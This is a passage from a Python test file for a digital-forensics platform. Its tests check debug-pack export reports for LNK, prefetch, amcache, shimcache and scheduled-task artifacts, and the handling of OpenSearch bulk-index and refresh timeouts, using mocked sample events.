        size_bytes=1,
        ingest_status=IngestStatus.completed,
        metadata_json={},
        error_log={},
    )
    session = _FakeSession(case, [evidence])
    request = DebugExportRequest(scope="evidence", evidence_id="evidence-1")
    lnk_event = {
        "id": "evt-lnk-1",
        "event_id": "evt-lnk-1",
        "case_id": "case-1",
        "evidence_id": "evidence-1",
        "source_file": "C:\\Users\\alex\\Recent\\report.lnk",
        "source_tool": "native_lnk",
        "source_format": "lnk",
        "@timestamp": "2026-05-12T12:00:00Z",
        "artifact": {"type": "lnk", "parser": "lnk_raw"},
        "event": {"category": "file_access", "type": "file_opened", "timeline_include": True, "severity": "info", "message": "LNK indicates recent access/reference"},
        "lnk": {"effective_path": "C:\\Users\\alex\\Documents\\report.docx", "source_file": "C:\\Users\\alex\\Recent\\report.lnk"},
        "tags": ["lnk", "file_access"],
        "raw_summary": "LNK sample",
        "search_text": "report.lnk report.docx",
    }
    monkeypatch.setattr("app.services.debug_export._fetch_events_for_scope", lambda context: {"sampled_events": [lnk_event], "total_events": 10, "evtx_classification_sample": []})
    monkeypatch.setattr("app.services.debug_export._collect_rules_matches", lambda db, context: [])
    monkeypatch.setattr("app.services.debug_export._collect_semiauto_analysis", lambda db, context: {"sections": {}, "counts": {}, "activities": []})
    monkeypatch.setattr("app.services.debug_export._load_manifests", lambda context: {"evidence-1": {"artifacts": [{"artifact_type": "lnk", "parser": "lnk_raw", "status": "completed", "source_path": "C:\\Users\\alex\\Recent\\report.lnk", "ingest_audit": {"lnk_files_seen": 1, "lnk_files_parsed": 1, "lnk_events_indexed": 1, "network_path_count": 0, "removable_path_count": 0, "startup_lnk_count": 0, "cloud_path_count": 0, "unresolved_target_count": 0, "partial_target_count": 0}}], "stats": {"indexed_events": 10}, "files": []}})
    monkeypatch.setattr("app.services.debug_export._collect_discovery_candidates", lambda context: [{"artifact_type": "lnk_raw", "lnk_location": "recent", "category": "lnk", "selected_for_extraction": True}])
    monkeypatch.setattr("app.services.debug_export._collect_indexing_errors", lambda context, manifests: [])
    monkeypatch.setattr("app.services.debug_export._collect_scope_counts", lambda context, scope_query: (1, 0))
    monkeypatch.setattr("app.services.debug_export._count_rules_matches", lambda db, context: 0)
    zip_bytes, _ = generate_debug_pack(session, "case-1", request)
    archive = zipfile.ZipFile(io.BytesIO(zip_bytes))
    normalized = archive.read("normalized_events_sample.jsonl").decode("utf-8")
    report = json.loads(archive.read("lnk_parse_report.json").decode("utf-8"))
    assert '"parser": "lnk_raw"' in normalized
    assert '"source_tool": "native_lnk"' in normalized
    assert report["total_lnk_candidates"] == 1
    assert report["total_lnk_parsed"] == 1


def test_generate_debug_pack_lnk_report_includes_selected_and_not_selected_counts(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    case = Case(id="case-1", name="Debug Case")
    evidence = Evidence(
        id="evidence-1",
        case_id="case-1",
        original_filename="sample.zip",
        stored_path=str(tmp_path / "sample.zip"),
        evidence_type=EvidenceType.parsed_folder,
        sha256="00",
        size_bytes=1,
        ingest_status=IngestStatus.completed,
        metadata_json={"selected_artifact_types": ["lnk"]},
        error_log={},
    )
    session = _FakeSession(case, [evidence])
    request = DebugExportRequest(scope="evidence", evidence_id="evidence-1")
    lnk_event = {
        "id": "evt-lnk-1",
        "artifact": {"type": "lnk", "parser": "lnk_raw"},
        "event": {"type": "shortcut_to_executable"},
        "lnk": {"effective_path": "C:\\Program Files\\App\\app.exe", "effective_path_source": "icon_location_low_confidence", "source_file": "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\App.lnk"},
        "source_tool": "native_lnk",
        "source_format": "lnk",
        "search_text": "x",
        "raw_summary": "y",
    }
    monkeypatch.setattr("app.services.debug_export._fetch_events_for_scope", lambda context: {"sampled_events": [lnk_event], "total_events": 1, "evtx_classification_sample": []})
    monkeypatch.setattr("app.services.debug_export._collect_rules_matches", lambda db, context: [])
    monkeypatch.setattr("app.services.debug_export._collect_semiauto_analysis", lambda db, context: {"sections": {}, "counts": {}, "activities": []})
    monkeypatch.setattr("app.services.debug_export._load_manifests", lambda context: {"evidence-1": {"artifacts": [], "stats": {"indexed_events": 1}, "files": []}})
    monkeypatch.setattr("app.services.debug_export._collect_discovery_candidates", lambda context: [{"artifact_type": "lnk_raw", "lnk_location": "start_menu", "category": "lnk", "selected_for_extraction": True}, {"artifact_type": "evtx_raw", "category": "evtx", "selected_for_extraction": False}])
    monkeypatch.setattr("app.services.debug_export._collect_indexing_errors", lambda context, manifests: [])
    monkeypatch.setattr("app.services.debug_export._collect_scope_counts", lambda context, scope_query: (1, 0))
    monkeypatch.setattr("app.services.debug_export._count_rules_matches", lambda db, context: 0)
    zip_bytes, _ = generate_debug_pack(session, "case-1", request)
    archive = zipfile.ZipFile(io.BytesIO(zip_bytes))
    report = json.loads(archive.read("lnk_parse_report.json").decode("utf-8"))
    manifest = json.loads(archive.read("manifest.json").decode("utf-8"))
    assert report["resolved_by_source"]["icon_location_low_confidence"] == 1
    assert report["selected_artifact_types"] == ["lnk"]
    assert report["not_selected_candidates_count_by_category"]["evtx"] == 1
    assert manifest["selected_artifact_types"] == ["lnk"]


def test_debug_export_scope_search_request_caps_page_size_to_search_request_limit(tmp_path: Path) -> None:
    case = Case(id="case-1", name="Debug Case")
    evidence = Evidence(
        id="evidence-1",
        case_id="case-1",
        original_filename="sample.zip",
        stored_path=str(tmp_path / "sample.zip"),
        evidence_type=EvidenceType.parsed_folder,
        sha256="00",
        size_bytes=1,
        ingest_status=IngestStatus.completed,
        metadata_json={"selected_artifact_types": ["detection"]},
        error_log={},
    )
    context = _DebugPackContext(
        case=case,
        evidences=[evidence],
        request=DebugExportRequest(scope="evidence", evidence_id="evidence-1", max_events_per_type=250),
        export_timestamp=datetime.now(UTC),
    )
    search_request = _build_scope_search_request(context, page_size=min(max(context.request.max_events_per_type * 30, 300), 200))
    assert search_request.page_size == 200


def test_refresh_index_timeout_is_non_fatal_when_requested(monkeypatch: pytest.MonkeyPatch) -> None:
    class _FakeIndices:
        def __init__(self) -> None:
            self.calls = 0

        def refresh(self, *, index: str) -> None:
            self.calls += 1
            raise TimeoutError(f"refresh timeout for {index}")

    fake_indices = _FakeIndices()
    fake_client = SimpleNamespace(indices=fake_indices)
    monkeypatch.setattr("app.core.opensearch.get_opensearch_client", lambda **kwargs: fake_client)
    monkeypatch.setattr("app.core.opensearch.time.sleep", lambda _: None)

    report = refresh_index(
        "dfir-events-case-1",
        request_timeout=5,
        attempts=2,
        backoff_seconds=(0.0, 0.0),
        raise_on_error=False,
    )

    assert report["success"] is False
    assert report["timeout"] is True
    assert report["non_fatal"] is True
    assert report["attempts"] == 2
    assert "timeout" in str(report["error_summary"]).lower()
    assert fake_indices.calls == 2


def test_bulk_index_events_still_raises_on_item_errors(monkeypatch: pytest.MonkeyPatch) -> None:
    class _FakeClient:
        def bulk(self, *, body, refresh):  # noqa: ANN001
            return {
                "errors": True,
                "items": [
                    {
                        "index": {
                            "_id": "doc-1",
                            "error": {"type": "mapper_parsing_exception", "reason": "bad field"},
                        }
                    }
                ],
            }

    monkeypatch.setattr(
        "app.core.opensearch.load_runtime_settings",
        lambda db: {"OPENSEARCH_BULK_DOCS": 1000, "OPENSEARCH_BULK_BYTES": 1048576},
    )

    with pytest.raises(RuntimeError, match="OpenSearch bulk indexing failed"):
        bulk_index_events(
            "case-1",
            [{"id": "doc-1", "event_id": "doc-1", "case_id": "case-1", "evidence_id": "ev-1"}],
            index="dfir-events-case-1",
            client=_FakeClient(),
            refresh=False,
        )


def test_bulk_timeout_then_retry_success_is_non_fatal(monkeypatch: pytest.MonkeyPatch) -> None:
    class _FakeClient:
        def __init__(self) -> None:
            self.calls = 0

        def bulk(self, *, body, refresh):  # noqa: ANN001
            self.calls += 1
            if self.calls == 1:
                raise TimeoutError("bulk timed out")
            return {"errors": False, "items": [{"index": {"_id": body[0]["index"]["_id"]}}]}

        def mget(self, *, index, body):  # noqa: ANN001
            return {"docs": [{"_id": value, "found": False} for value in body["ids"]]}

    monkeypatch.setattr(
        "app.core.opensearch.load_runtime_settings",
        lambda db: {"OPENSEARCH_BULK_DOCS": 1000, "OPENSEARCH_BULK_BYTES": 1048576},
    )
    monkeypatch.setattr("app.core.opensearch.time.sleep", lambda _: None)

    report = bulk_index_events_with_report(
        "case-1",
        [{"id": "doc-1", "event_id": "doc-1", "case_id": "case-1", "evidence_id": "ev-1"}],
        index="dfir-events-case-1",
        client=_FakeClient(),
        refresh=False,
        attempts=3,
        backoff_seconds=(0.0, 0.0, 0.0),
    )

    assert report["success"] is True
    assert report["timeouts"] == 1
    assert report["retries"] == 1
    assert report["documents_indexed"] == 1
    assert "opensearch_bulk_retry_used" in report["warnings"]


def test_bulk_timeout_with_already_indexed_docs_is_recovered_without_duplicates(monkeypatch: pytest.MonkeyPatch) -> None:
    store: dict[str, dict] = {}

    class _FakeClient:
        def bulk(self, *, body, refresh):  # noqa: ANN001
            for index_action, document in zip(body[0::2], body[1::2], strict=False):
                store[index_action["index"]["_id"]] = document
            raise TimeoutError("bulk timed out after commit")

        def mget(self, *, index, body):  # noqa: ANN001
            return {"docs": [{"_id": value, "found": value in store} for value in body["ids"]]}

    monkeypatch.setattr(
        "app.core.opensearch.load_runtime_settings",
        lambda db: {"OPENSEARCH_BULK_DOCS": 1000, "OPENSEARCH_BULK_BYTES": 1048576},
    )

    docs = [{"id": f"doc-{idx}", "event_id": f"doc-{idx}", "case_id": "case-1", "evidence_id": "ev-1"} for idx in range(8)]
    report = bulk_index_events_with_report(
        "case-1",
        docs,
        index="dfir-events-case-1",
        client=_FakeClient(),
        refresh=False,
        attempts=3,
        backoff_seconds=(0.0, 0.0, 0.0),
    )

    assert report["success"] is True
    assert report["timeouts"] == 1
    assert report["retries"] == 0
    assert report["documents_recovered_after_timeout"] == 8
    assert report["documents_indexed"] == 8
    assert len(store) == 8
    assert "opensearch_bulk_timeout_recovered" in report["warnings"]


def test_bulk_index_can_skip_host_identity_for_parallel_workers(monkeypatch: pytest.MonkeyPatch) -> None:
    class _FakeClient:
        def bulk(self, *, body, refresh):  # noqa: ANN001
            return {"errors": False, "items": [{"index": {"_id": body[0]["index"]["_id"]}}]}

        def mget(self, *, index, body):  # noqa: ANN001
            return {"docs": [{"_id": value, "found": False} for value in body["ids"]]}

    def fail_host_identity(*args, **kwargs):  # noqa: ANN001, ARG001
        raise AssertionError("host identity should not run in parallel bulk mode")

    monkeypatch.setattr("app.core.opensearch.apply_case_host_identity", fail_host_identity)

    report = bulk_index_events_with_report(
        "case-1",
        [{"id": "doc-1", "event_id": "doc-1", "case_id": "case-1", "evidence_id": "ev-1", "host": {"name": "HOSTA"}}],
        index="dfir-events-case-1",
        client=_FakeClient(),
        refresh=False,
        max_bulk_docs=1000,
        max_bulk_bytes=1048576,
        apply_host_identity=False,
    )

    assert report["success"] is True
    assert report["documents_indexed"] == 1
    assert "host_identity_skipped_for_parallel_bulk" in report["warnings"]


def test_debug_export_scope_search_retries_after_refresh_lag(monkeypatch: pytest.MonkeyPatch) -> None:
    calls: list[int] = []
    refresh_calls: list[dict] = []

    def _fake_search(context, *, size: int, extra_filters=None, timeline: bool = False):  # noqa: ANN001
        calls.append(size)
        if len(calls) == 1:
            return [], 0, {"bool": {"filter": [{"term": {"evidence_id": "ev-1"}}]}}
        return [
            {
                "id": "evt-1",
                "evidence_id": "ev-1",
                "artifact": {"type": "detection", "parser": "defender_csv"},
                "event": {"type": "malware_detected"},
            }
        ], 1, {"bool": {"filter": [{"term": {"evidence_id": "ev-1"}}]}}

    def _fake_refresh(index: str, **kwargs) -> dict:  # noqa: ANN003
        refresh_calls.append({"index": index, **kwargs})
        return {
            "attempted": True,
            "success": False,
            "timeout": True,
            "non_fatal": True,
            "attempts": 1,
            "request_timeout": kwargs.get("request_timeout"),
            "error_summary": "TimeoutError: refresh timeout",
        }

    monkeypatch.setattr("app.services.debug_export._search_scope_events", _fake_search)
    monkeypatch.setattr("app.services.debug_export.refresh_index", _fake_refresh)
    monkeypatch.setattr("app.services.debug_export.time.sleep", lambda _: None)

    context = _DebugPackContext(
        case=SimpleNamespace(id="case-1"),
        evidences=[SimpleNamespace(metadata_json={"indexed_events": 8})],
        request=DebugExportRequest(scope="evidence", evidence_id="ev-1", artifact_types=["detection"], max_events_per_type=5),
        export_timestamp=datetime.now(UTC),
    )

    fetched = _fetch_events_for_scope(context)

    assert fetched.total_events == 1
    assert fetched.sampled_events
    assert refresh_calls
    assert len(calls) >= 2


def test_ingest_summary_includes_refresh_warning_metadata() -> None:
    case = Case(id="case-1", name="Case 1")
    evidence = Evidence(
        id="ev-1",
        case_id="case-1",
        original_filename="defender.zip",
        stored_path="/tmp/defender.zip",
        evidence_type=EvidenceType.unknown,
        sha256="abc",
        size_bytes=1,
        ingest_status=IngestStatus.completed,
        metadata_json={
            "indexed_events": 8,
            "opensearch_refresh": {
                "attempted": True,
                "success": False,
                "timeout": True,
                "non_fatal": True,
                "attempts": 3,
                "refresh_timeout_seconds": 120,
                "error_summary": "ConnectionTimeout",
            },
        },
        error_log={"errors": [], "warnings": ["opensearch_refresh_timeout_non_fatal"]},
    )
    context = _DebugPackContext(case=case, evidences=[evidence], request=DebugExportRequest(scope="evidence", evidence_id="ev-1"), export_timestamp=datetime.now(UTC))

    rows = _build_ingest_summary(context, manifests={"ev-1": {"stats": {"indexed_events": 8}}})

    assert rows[0]["warnings"] == ["opensearch_refresh_timeout_non_fatal"]
    assert rows[0]["opensearch_refresh"]["timeout"] is True


def test_generate_debug_pack_lnk_scope_does_not_relabel_amcache_named_lnk_as_amcache(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    case = Case(id="case-1", name="Debug Case")
    evidence = Evidence(
        id="evidence-1",
        case_id="case-1",
        original_filename="sample.zip",
        stored_path=str(tmp_path / "sample.zip"),
        evidence_type=EvidenceType.parsed_folder,
        sha256="00",
        size_bytes=1,
        ingest_status=IngestStatus.completed,
        metadata_json={"selected_artifact_types": ["lnk"]},
        error_log={},
    )
    session = _FakeSession(case, [evidence])
    request = DebugExportRequest(scope="evidence", evidence_id="evidence-1", artifact_types=["lnk"])
    lnk_event = normalize_row(
        "case-1",
        "evidence-1",
        "art-1",
        {
            "SourceFile": "C:\\Users\\dfir\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\AmcacheParser_DriveBinaries.csv.lnk",
            "TargetPath": "C:\\Users\\dfir\\Desktop\\AmcacheParser_DriveBinaries.csv",
            "TargetAccessed": "2026-05-12T09:00:00+00:00",
        },
        {"name": "LNK raw - AmcacheParser_DriveBinaries.csv.lnk", "artifact_type": "lnk", "parser": "lnk_raw", "source_tool": "native_lnk", "source_format": "lnk"},
    )
    monkeypatch.setattr("app.services.debug_export._fetch_events_for_scope", lambda context: {"sampled_events": [lnk_event], "total_events": 1, "evtx_classification_sample": []})
    monkeypatch.setattr("app.services.debug_export._collect_rules_matches", lambda db, context: [])
    monkeypatch.setattr("app.services.debug_export._collect_semiauto_analysis", lambda db, context: {"sections": {}, "counts": {}, "activities": []})
    monkeypatch.setattr("app.services.debug_export._load_manifests", lambda context: {"evidence-1": {"artifacts": [], "stats": {"indexed_events": 1}, "files": []}})
    monkeypatch.setattr("app.services.debug_export._collect_discovery_candidates", lambda context: [])
    monkeypatch.setattr("app.services.debug_export._collect_indexing_errors", lambda context, manifests: [])
    monkeypatch.setattr("app.services.debug_export._collect_scope_counts", lambda context, scope_query: (1, 0))
    monkeypatch.setattr("app.services.debug_export._count_rules_matches", lambda db, context: 0)
    zip_bytes, _ = generate_debug_pack(session, "case-1", request)
    archive = zipfile.ZipFile(io.BytesIO(zip_bytes))
    normalized = archive.read("normalized_events_sample.jsonl").decode("utf-8")
    assert '"type": "lnk"' in normalized
    assert '"amcache_program_observed"' not in normalized


def test_generate_debug_pack_includes_prefetch_parse_report(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    case = Case(id="case-1", name="Debug Case")
    evidence = Evidence(
        id="evidence-1",
        case_id="case-1",
        original_filename="sample.zip",
        stored_path=str(tmp_path / "sample.zip"),
        evidence_type=EvidenceType.parsed_folder,
        sha256="00",
        size_bytes=1,
        ingest_status=IngestStatus.completed,
        metadata_json={"selected_artifact_types": ["prefetch"]},
        error_log={},
    )
    session = _FakeSession(case, [evidence])
    request = DebugExportRequest(scope="evidence", evidence_id="evidence-1", artifact_types=["prefetch"])
    prefetch_event = {
        "id": "evt-prefetch-1",
        "artifact": {"type": "prefetch", "parser": "prefetch_raw"},
        "event": {"type": "process_executed", "category": "execution", "message": "Prefetch execution observed: CHROME.EXE run_count=4", "severity": "info", "timeline_include": True},
        "process": {"name": "CHROME.EXE", "path": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"},
        "execution": {"source": "prefetch", "run_count": 4, "last_run": "2026-05-03T10:00:00+00:00", "is_execution_confirmed": True},
        "prefetch": {
            "executable_name": "CHROME.EXE",
            "executable_path": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
            "prefetch_hash": "D999B1B4",
            "run_count": 4,
            "last_run": "2026-05-03T10:00:00+00:00",
            "parse_warnings": [],
        },
        "source_tool": "native_prefetch",
        "source_format": "pf",
        "source_file": "C:\\Windows\\Prefetch\\CHROME.EXE-D999B1B4.pf",
        "tags": ["prefetch", "execution", "browser"],
        "raw_summary": "Executable=CHROME.EXE",
        "search_text": "CHROME.EXE D999B1B4",
    }
    monkeypatch.setattr("app.services.debug_export._fetch_events_for_scope", lambda context: {"sampled_events": [prefetch_event], "total_events": 1, "evtx_classification_sample": []})
    monkeypatch.setattr("app.services.debug_export._collect_rules_matches", lambda db, context: [])
    monkeypatch.setattr("app.services.debug_export._collect_semiauto_analysis", lambda db, context: {"sections": {}, "counts": {}, "activities": []})
    monkeypatch.setattr("app.services.debug_export._load_manifests", lambda context: {"evidence-1": {"artifacts": [{"artifact_type": "prefetch", "parser": "prefetch_raw", "status": "completed", "source_path": "C:\\Windows\\Prefetch\\CHROME.EXE-D999B1B4.pf", "ingest_audit": {"prefetch_files_seen": 1, "prefetch_files_parsed": 1, "prefetch_events_indexed": 1, "prefetch_resolved_executable_path_count": 1, "prefetch_unresolved_executable_path_count": 0, "suspicious_prefetch_count": 0, "lolbin_prefetch_count": 0, "by_version": {"30": 1}}}], "stats": {"indexed_events": 1}, "files": []}})
    monkeypatch.setattr("app.services.debug_export._collect_discovery_candidates", lambda context: [{"artifact_type": "prefetch_raw", "category": "prefetch", "selected_for_extraction": True, "executable_name_guess": "CHROME.EXE", "prefetch_hash_guess": "D999B1B4"}])
    monkeypatch.setattr("app.services.debug_export._collect_indexing_errors", lambda context, manifests: [])
    monkeypatch.setattr("app.services.debug_export._collect_scope_counts", lambda context, scope_query: (1, 0))
    monkeypatch.setattr("app.services.debug_export._count_rules_matches", lambda db, context: 0)
    zip_bytes, _ = generate_debug_pack(session, "case-1", request)
    archive = zipfile.ZipFile(io.BytesIO(zip_bytes))
    report = json.loads(archive.read("prefetch_parse_report.json").decode("utf-8"))
    normalized = archive.read("normalized_events_sample.jsonl").decode("utf-8")
    assert report["total_prefetch_candidates"] == 1
    assert report["total_prefetch_completed"] == 1
    assert report["resolved_executable_path_count"] == 1
    assert report["by_version"]["30"] == 1
    assert report["version_counts"]["30"] == 1
    assert '"parser": "prefetch_raw"' in normalized
    assert '"source_tool": "native_prefetch"' in normalized


def test_generate_debug_pack_includes_amcache_parse_report(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    case = Case(id="case-1", name="Debug Case")
    evidence = Evidence(
        id="evidence-1",
        case_id="case-1",
        original_filename="sample.zip",
        stored_path=str(tmp_path / "sample.zip"),
        evidence_type=EvidenceType.parsed_folder,
        sha256="00",
        size_bytes=1,
        ingest_status=IngestStatus.completed,
        metadata_json={"selected_artifact_types": ["amcache"]},
        error_log={},
    )
    session = _FakeSession(case, [evidence])
    request = DebugExportRequest(scope="evidence", evidence_id="evidence-1", artifact_types=["amcache"])
    amcache_event = {
        "id": "evt-amcache-1",
        "artifact": {"type": "amcache", "parser": "amcache_raw"},
        "event": {"type": "execution_candidate", "category": "execution", "message": "Amcache executable candidate observed: agent.exe", "severity": "low", "timeline_include": True},
        "process": {"name": "agent.exe", "path": "C:\\Users\\alex\\Downloads\\agent.exe"},
        "file": {"name": "agent.exe", "path": "C:\\Users\\alex\\Downloads\\agent.exe"},
        "amcache": {"program_name": "Contoso Agent", "source_file": "C:\\Windows\\AppCompat\\Programs\\Amcache.hve", "parser_status": "parsed_native"},
        "execution": {"source": "amcache", "program_name": "agent.exe", "is_execution_confirmed": False, "confidence": "low"},
        "source_tool": "native_amcache",
        "source_format": "registry_hive",
        "raw_summary": "Amcache sample",
        "search_text": "agent.exe Contoso Agent",
        "tags": ["amcache", "execution_candidate"],
    }
    monkeypatch.setattr("app.services.debug_export._fetch_events_for_scope", lambda context: {"sampled_events": [amcache_event], "total_events": 1, "evtx_classification_sample": []})
    monkeypatch.setattr("app.services.debug_export._collect_rules_matches", lambda db, context: [])
    monkeypatch.setattr("app.services.debug_export._collect_semiauto_analysis", lambda db, context: {"sections": {}, "counts": {}, "activities": []})
    monkeypatch.setattr("app.services.debug_export._load_manifests", lambda context: {"evidence-1": {"artifacts": [{"artifact_type": "amcache", "parser": "amcache_raw", "status": "completed", "source_path": "C:\\Windows\\AppCompat\\Programs\\Amcache.hve", "ingest_audit": {"detected_amcache_files": 1, "records_read": 2, "records_parsed": 2, "records_failed": 0, "records_extracted": 2, "events_indexed": 1, "sample_records": [{"file_name": "agent.exe"}], "amcache_branch_counts": {"InventoryApplicationFile": 1}}}], "stats": {"indexed_events": 1}, "files": []}})
    monkeypatch.setattr("app.services.debug_export._collect_discovery_candidates", lambda context: [{"artifact_type": "amcache", "category": "amcache", "selected_for_extraction": True}])
    monkeypatch.setattr("app.services.debug_export._collect_indexing_errors", lambda context, manifests: [])
    monkeypatch.setattr("app.services.debug_export._collect_scope_counts", lambda context, scope_query: (1, 0))
    monkeypatch.setattr("app.services.debug_export._count_rules_matches", lambda db, context: 0)
    zip_bytes, _ = generate_debug_pack(session, "case-1", request)
    archive = zipfile.ZipFile(io.BytesIO(zip_bytes))
    report = json.loads(archive.read("amcache_parse_report.json").decode("utf-8"))
    normalized = archive.read("normalized_events_sample.jsonl").decode("utf-8")
    assert report["aggregation_scope"] == "evidence"
    assert report["records_read"] == 2
    assert report["records_parsed"] == 2
    assert report["records_failed"] == 0
    assert report["records_indexed"] == 1
    assert report["detected_amcache_files"] == 1
    assert report["parser_selected"] == "amcache_raw"
    assert report["records_extracted"] == 2
    assert report["sample_records"] == [{"file_name": "agent.exe"}]
    assert '"parser": "amcache_raw"' in normalized
    assert '"source_tool": "native_amcache"' in normalized


def test_build_amcache_parse_report() -> None:
    parser_audit = [
        {
            "parser_name": "amcache_raw",
            "parser_status": "parsed_native",
            "detected_amcache_files": 1,
            "records_read": 3,
            "records_parsed": 3,
            "records_failed": 0,
            "records_extracted": 3,
            "records_indexed": 2,
            "sample_records": [{"file_name": "agent.exe"}],
            "amcache_branch_counts": {"InventoryApplication": 1, "InventoryApplicationFile": 2},
            "warnings": ["missing_branch:Root\\File"],
            "errors": [],
        }
    ]
    discovery_candidates = [{"artifact_type": "amcache", "category": "amcache", "selected_for_extraction": True}]
    events = [
        {"artifact": {"type": "amcache", "parser": "amcache_raw"}, "event": {"type": "installed_program_observed"}},
        {"artifact": {"type": "amcache", "parser": "amcache_raw"}, "event": {"type": "execution_candidate"}},
    ]
    report = _build_amcache_parse_report(parser_audit, discovery_candidates, events, scope="evidence")
    assert report["aggregation_scope"] == "evidence"
    assert report["amcache_artifacts_count"] == 1
    assert report["detected_amcache_files"] == 1
    assert report["records_read"] == 3
    assert report["records_parsed"] == 3
    assert report["records_failed"] == 0
    assert report["records_extracted"] == 3
    assert report["records_indexed"] == 2
    assert report["by_event_type"]["execution_candidate"] == 1
    assert report["branch_counts"]["InventoryApplicationFile"] == 2
    assert report["sample_records"] == [{"file_name": "agent.exe"}]


def test_build_shimcache_parse_report() -> None:
    parser_audit = [
        {
            "parser_name": "shimcache_raw",
            "parser_status": "parsed_native",
            "detected_shimcache_sources": 1,
            "records_read": 2,
            "records_parsed": 2,
            "records_failed": 0,
            "records_extracted": 2,
            "records_indexed": 2,
            "sample_records": [{
                "path": r"\\?\C:\Users\alex\Downloads\invoice.pdf.exe",
                "original_path": r"\\?\C:\Users\alex\Downloads\invoice.pdf.exe",
                "file_name": "invoice.pdf.exe",
            }],
            "control_sets_seen": ["ControlSet001"],
            "shimcache_format_counts": {"win10": 2},
            "warnings": [],
            "errors": [],
        }
    ]
    discovery_candidates = [{"artifact_type": "shimcache", "category": "shimcache", "selected_for_extraction": True}]
    events = [
        {
            "artifact": {"type": "shimcache", "parser": "shimcache_raw"},
            "event": {"type": "execution_candidate"},
            "file": {"path": r"C:\Users\alex\Downloads\invoice.pdf.exe"},
            "shimcache": {"path": r"C:\Users\alex\Downloads\invoice.pdf.exe"},
            "tags": ["shimcache", "execution_candidate", "user_writable_path"],
            "risk_score": 20,
        },
        {"artifact": {"type": "shimcache", "parser": "shimcache_raw"}, "event": {"type": "execution_candidate"}},
    ]
    report = _build_shimcache_parse_report(parser_audit, discovery_candidates, events, scope="evidence")
    assert report["aggregation_scope"] == "evidence"
    assert report["shimcache_artifacts_count"] == 1
    assert report["detected_shimcache_sources"] == 1
    assert report["records_read"] == 2
    assert report["records_parsed"] == 2
    assert report["records_failed"] == 0
    assert report["records_extracted"] == 2
    assert report["records_indexed"] == 2
    assert report["totals"]["records_read"] == 2
    assert report["totals"]["records_parsed"] == 2
    assert report["totals"]["records_indexed"] == 2
    assert report["totals"]["records_failed"] == 0
    assert report["sample_by_event_type"]["execution_candidate"] == 2
    assert report["control_sets_seen"] == ["ControlSet001"]
    assert report["sample_records"][0]["path"] == r"C:\Users\alex\Downloads\invoice.pdf.exe"
    assert report["sample_records"][0]["normalized_path"] == r"C:\Users\alex\Downloads\invoice.pdf.exe"
    assert report["sample_records"][0]["original_path"] == r"\\?\C:\Users\alex\Downloads\invoice.pdf.exe"
    assert report["sample_records"][0]["event_type"] == "execution_candidate"
    assert report["sample_records"][0]["risk_score"] == 20
    assert "user_writable_path" in report["sample_records"][0]["tags"]


def test_build_scheduled_tasks_parse_report() -> None:
    parser_audit = [
        {
            "parser_name": "scheduled_task_xml",
            "artifact_type": "scheduled_task",
            "parser_status": "parsed_native",
            "records_read": 1,
            "records_parsed": 1,
            "records_indexed": 1,
            "records_failed": 0,
            "sample_records": [{
                "source_file": r"C:\Windows\System32\Tasks\Microsoft\Windows\UpdateOrchestrator\Schedule Scan",
                "task_name": "Schedule Scan",
                "uri": r"\Microsoft\Windows\UpdateOrchestrator\Schedule Scan",
                "command": r"C:\Windows\System32\UsoClient.exe",
                "arguments": "StartScan",
                "enabled": True,
                "hidden": False,
                "triggers": [{"type": "CalendarTrigger"}],
                "risk_score": 0,
                "tags": ["scheduled_task", "persistence", "autorun", "execution_candidate"],
                "suspicious_reasons": [],
                "parser_status": "parsed_native",
            }],
            "warnings": [],
            "errors": [],
        }
    ]
    discovery_candidates = [{"category": "scheduled_task", "artifact_type": "scheduled_task", "selected_for_extraction": True}]
    events = [{"artifact": {"type": "scheduled_task", "parser": "scheduled_task_xml"}, "event": {"type": "scheduled_task"}}]
    report = _build_scheduled_tasks_parse_report(parser_audit, discovery_candidates, events, scope="evidence")
    assert report["aggregation_scope"] == "evidence"
    assert report["records_read"] == 1
    assert report["records_parsed"] == 1
    assert report["records_indexed"] == 1
    assert report["records_failed"] == 0
    assert report["sample_by_event_type"]["scheduled_task"] == 1
    assert report["sample_records"][0]["task_name"] == "Schedule Scan"
    assert report["sample_records"][0]["parser_status"] == "parsed_native"


def test_sanitize_event_keeps_execution_shimcache_and_appcompat_objects() -> None:
    request = DebugExportRequest(scope="evidence", evidence_id="ev-1")
    sanitized = _sanitize_event(
        {
            "id": "evt-1",
            "artifact": {"type": "shimcache", "parser": "shimcache_raw"},
            "event": {"type": "execution_candidate"},
            "execution": {"source": "shimcache", "confidence": "low", "is_execution_confirmed": False},
            "shimcache": {"path": r"C:\Windows\System32\a.exe"},
            "appcompat": {"path": r"C:\Windows\System32\a.exe"},
        },
        request,
    )
    assert sanitized["execution"]["source"] == "shimcache"
    assert sanitized["shimcache"]["path"] == r"C:\Windows\System32\a.exe"
    assert sanitized["appcompat"]["path"] == r"C:\Windows\System32\a.exe"


def test_sanitize_event_hydrates_shimcache_and_appcompat_objects_from_normalized_event() -> None:
    request = DebugExportRequest(scope="evidence", evidence_id="ev-1")
    sanitized = _sanitize_event(
        {
            "id": "evt-2",
            "source_file": r"C:\Windows\System32\config\SYSTEM",
            "artifact": {"type": "shimcache", "parser": "shimcache_raw"},
            "event": {"type": "execution_candidate"},
            "timestamp_precision": "shimcache_last_modified",
            "execution": {
                "source": "shimcache",
                "confidence": "low",
                "is_execution_confirmed": False,
                "interpretation": "Shimcache/AppCompatCache indicates file presence or compatibility cache entry, not execution by itself",
                "last_modified": "2026-05-09T16:16:50.497874+00:00",
            },
            "file": {"path": r"\\?\C:\Windows\System32\SecurityHealth\10.0.29554.1001-0\SecurityHealthHost.exe", "name": "SecurityHealthHost.exe", "modified": "2026-05-09T16:16:50.497874+00:00"},
            "shimcache": {},
            "appcompat": {},
        },
        request,
    )
    assert sanitized["shimcache"]["artifact_type"] == "shimcache_raw"
    assert sanitized["shimcache"]["path"] == r"C:\Windows\System32\SecurityHealth\10.0.29554.1001-0\SecurityHealthHost.exe"
    assert sanitized["shimcache"]["source_file"] == r"C:\Windows\System32\config\SYSTEM"
    assert sanitized["shimcache"]["timestamp_interpretation"] == "shimcache_last_modified"
